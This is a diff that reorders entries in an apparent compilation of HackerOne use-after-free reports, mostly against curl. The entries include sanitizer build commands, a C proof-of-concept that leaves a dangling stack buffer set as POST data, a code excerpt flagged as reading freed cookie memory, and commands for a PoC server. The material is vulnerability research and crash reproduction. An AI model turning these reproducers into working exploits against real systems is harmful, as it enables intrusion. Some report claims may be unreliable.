@@ -588,49 +588,6 @@ case CURLOPT_REFERER:
     break;
 ```
 
-## #3279804 Stack use-after-scope in HTTP/3 POST request processing via CURLOPT_POSTFIELDS — curl — - — Use After Free
-Source: `hackerone/reports/2025/3279804.md` (https://hackerone.com/reports/3279804)
-
-```
-  export CC=clang
-  export CFLAGS="-O1 -g -fsanitize=address,undefined"
-  ./configure --with-openssl --with-nghttp2 --with-nghttp3 --with-ngtcp2
-  make
-```
-
-```
-  // http3_crash_poc.c
-  #include <curl/curl.h>
-  #include <string.h>
-
-  int main() {
-      CURL *curl = curl_easy_init();
-
-      // Stack-allocated buffer that goes out of scope
-      {
-          char body_data[257];
-          memset(body_data, 'A', 256);
-          body_data[256] = '\0';
-
-          curl_easy_setopt(curl, CURLOPT_URL, "https://example.com/");
-          curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_3);
-          curl_easy_setopt(curl, CURLOPT_POST, 1L);
-          curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body_data); // Vulnerable call
-          curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, 50L);
-      } // body_data goes out of scope here
-
-      // libcurl accesses invalid memory during transfer
-      curl_easy_perform(curl);
-      curl_easy_cleanup(curl);
-      return 0;
-  }
-```
-
-```
-  clang -fsanitize=address http3_crash_poc.c -lcurl -o poc
-  ./poc
-```
-
 ## #988103 Node.js: use-after-free in TLSWrap — nodejs — - — Use After Free
 Source: `hackerone/reports/2021/988103.md` (https://hackerone.com/reports/988103)
 
@@ -697,6 +654,49 @@ READ of size 8 at 0x608000011138 thread T0
     #6 0x16faa47 in void node::StreamBase::JSMethod<&(node::StreamBase::Writev(v8::FunctionCallbackInfo<v8::Value> const&))>(v8::FunctionCallbackInfo<v8::Value> const&) /pwd/out/../src/stream_base.cc:468:29
     #7 0x1caf642 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo) /pwd/out/../deps/v8/src/api/api-arguments-inl.h:158:3
     #8 0
+```
+
+## #3279804 Stack use-after-scope in HTTP/3 POST request processing via CURLOPT_POSTFIELDS — curl — - — Use After Free
+Source: `hackerone/reports/2025/3279804.md` (https://hackerone.com/reports/3279804)
+
+```
+  export CC=clang
+  export CFLAGS="-O1 -g -fsanitize=address,undefined"
+  ./configure --with-openssl --with-nghttp2 --with-nghttp3 --with-ngtcp2
+  make
+```
+
+```
+  // http3_crash_poc.c
+  #include <curl/curl.h>
+  #include <string.h>
+
+  int main() {
+      CURL *curl = curl_easy_init();
+
+      // Stack-allocated buffer that goes out of scope
+      {
+          char body_data[257];
+          memset(body_data, 'A', 256);
+          body_data[256] = '\0';
+
+          curl_easy_setopt(curl, CURLOPT_URL, "https://example.com/");
+          curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_3);
+          curl_easy_setopt(curl, CURLOPT_POST, 1L);
+          curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body_data); // Vulnerable call
+          curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, 50L);
+      } // body_data goes out of scope here
+
+      // libcurl accesses invalid memory during transfer
+      curl_easy_perform(curl);
+      curl_easy_cleanup(curl);
+      return 0;
+  }
+```
+
+```
+  clang -fsanitize=address http3_crash_poc.c -lcurl -o poc
+  ./poc
 ```
 
 ## #3022041 Use after free (read) in curl_multi_perform with DoH and Proxy options, and resolve timeouts — curl — - — Use After Free
@@ -889,6 +889,56 @@ SUMMARY: AddressSanitizer: heap-use-after-free /root/putty-0.70-2019-01-17.53747
     #2 0x41db89 in _start (/root/putty-0.70-2019-01-17.53747ad/puttygen+0x41db89)
 ```
 
+## #3516202 Cookie Replacement Use-After-Free Vulnerability — curl — - — Use After Free
+Source: `hackerone/reports/2026/3516202.md` (https://hackerone.com/reports/3516202)
+
+```
+static bool replace_existing(struct Curl_easy *data,
+                             struct Cookie *co,
+                             struct CookieInfo *ci,
+                             bool secure,
+                             bool *replacep)
+{
+    bool replace_old = FALSE;
+    struct Curl_llist_node *replace_n = NULL;
+    struct Curl_llist_node *n;
+    
+    // Iterate over cookie list
+    for(n = Curl_llist_head(&ci->cookielist[myhash]); n; n = Curl_node_next(n)) {
+        struct Cookie *clist = Curl_node_elem(n);
+        // ... comparison logic ...
+        if(replace_old)
+            replace_n = n;  // Store node for later deletion
+    }
+    
+    // Delete node after iteration
+    if(replace_n) {
+        struct Cookie *repl = Curl_node_elem(replace_n);
+        co->creationtime = repl->creationtime;  // Access freed memory
+        Curl_node_remove(replace_n);
+        freecookie(repl, TRUE);  // Free memory
+    }
+}
+```
+
+```
+# Run the PoC server
+python3 poc_cookie_uaf.py
+
+# Server starts on http://localhost:8000
+# Provides 3 different exploit scenarios
+```
+
+```
+cd curl
+export CFLAGS="-fsanitize=address -fno-omit-frame-pointer -g"
+export LDFLAGS="-fsanitize=address"
+./buildconf
+./configure --enable-debug --disable-shared
+make clean
+make
+```
+
 ## #3261310 OpenSSL HTTP/3 bogus CURLINFO_TLS_SSL_PTR — curl — - — Use After Free
 Source: `hackerone/reports/2025/3261310.md` (https://hackerone.com/reports/3261310)
 
@@ -985,56 +1035,6 @@ AddressSanitizer:DEADLYSIGNAL
                               size_t nitems, void *userdata)
 ```
 
-## #3516202 Cookie Replacement Use-After-Free Vulnerability — curl — - — Use After Free
-Source: `hackerone/reports/2026/3516202.md` (https://hackerone.com/reports/3516202)
-
-```
-static bool replace_existing(struct Curl_easy *data,
-                             struct Cookie *co,
-                             struct CookieInfo *ci,
-                             bool secure,
-                             bool *replacep)
-{
-    bool replace_old = FALSE;
-    struct Curl_llist_node *replace_n = NULL;
-    struct Curl_llist_node *n;
-    
-    // Iterate over cookie list
-    for(n = Curl_llist_head(&ci->cookielist[myhash]); n; n = Curl_node_next(n)) {
-        struct Cookie *clist = Curl_node_elem(n);
-        // ... comparison logic ...
-        if(replace_old)
-            replace_n = n;  // Store node for later deletion
-    }
-    
-    // Delete node after iteration
-    if(replace_n) {
-        struct Cookie *repl = Curl_node_elem(replace_n);
-        co->creationtime = repl->creationtime;  // Access freed memory
-        Curl_node_remove(replace_n);
-        freecookie(repl, TRUE);  // Free memory
-    }
-}
-```
-
-```
-# Run the PoC server
-python3 poc_cookie_uaf.py
-
-# Server starts on http://localhost:8000
-# Provides 3 different exploit scenarios
-```
-
-```
-cd curl
-export CFLAGS="-fsanitize=address -fno-omit-frame-pointer -g"
-export LDFLAGS="-fsanitize=address"
-./buildconf
-./configure --enable-debug --disable-shared
-make clean
-make
-```
-
 ## #3452725 Title: Use-After-Free in cURL Test Suite via Improper Cleanup of Global Handle — curl — - — Use After Free
 Source: `hackerone/reports/2025/3452725.md` (https://hackerone.com/reports/3452725)
 
@@ -1116,26 +1116,6 @@ test_cleanup:
 }
 ```
 
-## #3302518 ## Title  Heap Use-After-Free Vulnerability in `curl` Leading to Potential Code Execution — curl — - — Use After Free
-Source: `hackerone/reports/2025/3302518.md` (https://hackerone.com/reports/3302518)
-
-```
-if(data->set.errorbuffer && !data->state.errorbuf) {
-   strcpy(data->set.errorbuffer, error); 
-   data->state.errorbuf = TRUE; /* wrote error string */ 
-}
-```
-
-```
-mkdir build && cd build
-CC=clang CXX=clang++ cmake ..   -DCMAKE_BUILD_TYPE=Debug   -DCMAKE_C_FLAGS="-g -O1 -fsanitize=address"   -DBUILD_SHARED_LIBS=OFF   -DBUILD_STATIC_LIBS=ON   -DBUILD_TESTING=OFF   -DBUILD_EXAMPLES=OFF   -DENABLE_MANUAL=OFF
-cmake --build . --config Debug
-```
-
-```
-clang++ -g -O1 -fsanitize=address,fuzzer   -I../include   -I../src/include   vulnerablityfuzz.cpp ./lib/libcurl-d.a -o vulfuzz   -lpsl -ldl -lpthread -lssl -lcrypto -lz
-```
-
 ## #3824303 UAF read in mev_pollset_diff() trace path after curl_easy_pause() in socket callback — curl — - — Use After Free
 Source: `hackerone/reports/2026/3824303.md` (https://hackerone.com/reports/3824303)
 
@@ -1161,6 +1141,26 @@ if(entry)
              "total=%u/%d (xfer/conn)", s,
              Curl_uint32_spbset_count(&entry->xfers),
              entry->conn ? 1 : 0);
+```
+
+## #3302518 ## Title  Heap Use-After-Free Vulnerability in `curl` Leading to Potential Code Execution — curl — - — Use After Free
+Source: `hackerone/reports/2025/3302518.md` (https://hackerone.com/reports/3302518)
+
+```
+if(data->set.errorbuffer && !data->state.errorbuf) {
+   strcpy(data->set.errorbuffer, error); 
+   data->state.errorbuf = TRUE; /* wrote error string */ 
+}
+```
+
+```
+mkdir build && cd build
+CC=clang CXX=clang++ cmake ..   -DCMAKE_BUILD_TYPE=Debug   -DCMAKE_C_FLAGS="-g -O1 -fsanitize=address"   -DBUILD_SHARED_LIBS=OFF   -DBUILD_STATIC_LIBS=ON   -DBUILD_TESTING=OFF   -DBUILD_EXAMPLES=OFF   -DENABLE_MANUAL=OFF
+cmake --build . --config Debug
+```
+
+```
+clang++ -g -O1 -fsanitize=address,fuzzer   -I../include   -I../src/include   vulnerablityfuzz.cpp ./lib/libcurl-d.a -o vulfuzz   -lpsl -ldl -lpthread -lssl -lcrypto -lz
 ```
 
 ## #4033971 Use-after-free of the internal multi->admin easy handle via the documented CURLMOPT_NOTIFYFUNCTION callback — curl — - — Use After Free
